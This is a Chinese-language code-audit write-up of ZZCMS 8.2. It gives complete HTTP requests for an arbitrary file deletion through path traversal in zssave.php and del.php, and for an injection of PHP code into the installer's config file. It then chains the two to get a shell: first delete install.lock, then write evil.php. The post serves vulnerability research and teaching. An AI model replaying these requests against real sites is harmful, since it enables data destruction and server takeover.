**0x00 背景**

本周，将zzcms8.2的源码的GetShell方法与大家一同分享，在上周有说过这个CMS比较适合新手或想要入坑PHP代码审计的同学练手，所以分享下从一些容易发现的漏洞一步步到GetShell的过程，如果大家还有其他思路欢迎一同讨论，期待与师傅们的交流。

  

 **0x01 审计过程**

 **文件删除问题：**

 **0x00 相关环境**

源码信息：ZZCMS 8.2

问题文件： \zzcms\zzcms8.2\user\msg.php

漏洞类型：任意文件删除

站点地址：http://www.zzcms.net/

 **0x01 漏洞分析**

在\zzcms\zzcms8.2\user\del.php文件的第44-53行中得到如下代码块，通过分析代码块可以知道，是从数据库中取出图片路径然后进行删除操作,这里同样的操作除了zzcms_main操作外，还有第64行的zzcms_licence操作，这里只分析zzcms_main操作。

![操作1.png](https://image.3001.net/images/20180327/15221403838026.png!small)  

![操作 2.png](https://image.3001.net/images/20180327/1522140392254.png!small)  

因为此处是从数据库select操作中得到图片等文件的路径地址的，所以可以通过追踪对zzcms_main表进行insert或者update操作的代码，在\zzcms\zzcms8.2\user\zssave.php文件的第94-102行发现insert或者update操作。

![update.png](https://image.3001.net/images/20180327/15221404296857.png!small)  

且在\zzcms\zzcms8.2\user\zssave.php文件的第103-118行中，当传入的oldimg与数据中的img不同时会删除oldimg,因此此处存在任意文件删除操作。

![删除.png](https://image.3001.net/images/20180327/15221404554835.png!small)  

  

 **0x02 漏洞复现**

情况一：在action=add的情况下进行任意文件删除

首先进行如下请求在img参数位置填入要删除的文件路径，如根目录下的1.txt。

POST /user/zssave.php HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101
Firefox/56.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 289

Referer: http://127.0.0.1/user/zsadd.php

Cookie: PHPSESSID=7fto4uo32lis3t4caar14iuk74; bdshare_firstime=1521075384018;
UserName=Thinking; PassWord=05551a1478ef9b6aed2749f4b2fe45dd

Connection: close

Upgrade-Insecure-Requests: 1

proname=thinking&szm=&gnzz=thinking&sm=111111&province=%E8%AF%B7%E9%80%89%E6%8B%A9%E7%9C%81%E4%BB%BD&city=%E8%AF%B7%E9%80%89%E6%8B%A9%E5%9F%8E%E5%8C%BA&xiancheng=&cityforadd=&img=/1.txt&flv=&zc=&yq=&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF

然后数据库中会生成img列的值为/1.txt的内容。

![内容.png](https://image.3001.net/images/20180327/15221406703179.png!small)

然后进行如下请求，删除上面操作生成的那篇招商咨询，然后就会连1.txt一并删除。

POST /user/del.php HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101
Firefox/56.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 97

Referer: http://127.0.0.1/user/zsmanage.php

Cookie: PHPSESSID=7fto4uo32lis3t4caar14iuk74; bdshare_firstime=1521075384018;
UserName=Thinking; PassWord=05551a1478ef9b6aed2749f4b2fe45dd

Connection: close

Upgrade-Insecure-Requests: 1

id%5B%5D=16&submit=%E5%88%A0%E9%99%A4%0D%0A&pagename=zsmanage.php%3Fpage%3D1&tablename=zzcms_main

![main.png](https://image.3001.net/images/20180327/15221407163475.png!small)

  

情况二：在action=modify的情况下进行任意文件删除

进行如下请求在oldimg参数的位置构造要删除的目标文件，如根目录下的1.txt，所以可以使用../1.txt进行目录跳转后删除目标文件。

POST /user/zssave.php HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101
Firefox/56.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 290

Referer: http://127.0.0.1/user/zsmodify.php?id=15&page=1

Cookie: PHPSESSID=7fto4uo32lis3t4caar14iuk74; bdshare_firstime=1521075384018;
UserName=Thinking; PassWord=05551a1478ef9b6aed2749f4b2fe45dd

Connection: close

Upgrade-Insecure-Requests: 1

proname=11&szm=&gnzz=22&sm=33&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&oldimg=../1.txt&img=%2Fimage%2Fnopic.gif&oldflv=&flv=&zc=&yq=&cpid=15&action=modify&page=1&Submit=%E4%BF%9D%E5%AD%98%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C%0D%0A

![OA.png](https://image.3001.net/images/20180327/15221407579428.png!small)

  

**配置文件写入问题**

 **0x00 相关环境**

源码信息：ZZCMS 8.2

问题文件： \zzcms\zzcms8.2\install\index.php

漏洞类型：文件写入问题

站点地址：http://www.zzcms.net/

  

 **0x01 漏洞分析**

在\zzcms\zzcms8.2\install\index.php文件的第105-117行中发现如下代码块，用于将一些配置信息写入到配置文件中。

![wenjian.png](https://image.3001.net/images/20180327/15221409864981.png!small)

通过跟踪各个配置信息的传入过程，发现在\zzcms\zzcms8.2\install\index.php文件的第9-10行中使用了变量注册的方法进行变量的初始化。

![chushihua.png](https://image.3001.net/images/20180327/15221410081042.png!small)

分析代码可以知道，写入配置文件的操作并没有对传入的数据进行安全处理操作，因此仅需要按着流程走，然后在step=5的时候，在url位置传入恶意代码便可以进行代码写入的操作，当然其他位置也有可以写入的，我这里只是用最简单的位置来实现。

![shixian.png](https://image.3001.net/images/20180327/1522141054491.png!small)

  

**0x02 漏洞复现**

首先进行如下请求，将恶意代码写入到\zzcms\zzcms8.2\inc\config.php配置文件中：

POST /install/index.php HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101
Firefox/56.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 214

Referer: http://127.0.0.1/install/index.php

Connection: close

Upgrade-Insecure-Requests: 1

step=5&token=&db_host=localhost&db_port=3306&db_user=root&db_pass=root&db_name=zzcms&url=http%3A%2F%2F127.0.0.1');(fwrite(fopen("evil.php",
"w"), "<?php phpinfo();?>"));//&admin=admin&adminpwd=admin&adminpwd2=admin

然后访问http://127.0.0.1/inc/config.php便会生成evil.php文件,访问http://127.0.0.1/inc/evil.php便可以执行生成的恶意文件从而GetShell。

![shell.png](https://image.3001.net/images/20180327/15221412073500.png!small)

  

**0x02 小结**

本篇列举了ZZCMS8.2版本的任意文件删除与配置文件写入的问题，通过这两个漏洞的组合利用便可以GetShell，先使用任意文件删除漏洞，删除install.lock文件，然后便可以利用配置文件写入的问题写入恶意代码从而GetShell，当然GetShell的方式还有很多，这里仅仅是列举了一些分析起来比较简单的方法。大家如果有发现其他方法好玩的洞也欢迎与我私下一同聊聊thinking_balabala@163.com。

![qrcode_for_gh_223e082fe8a7_344.jpg](https://image.3001.net/images/20180327/15221412308204.jpg!small)  

 _ **注：本文仅限于学习和研究使用，禁止用于非法用途。一切非法用途，与原作者无关。**_

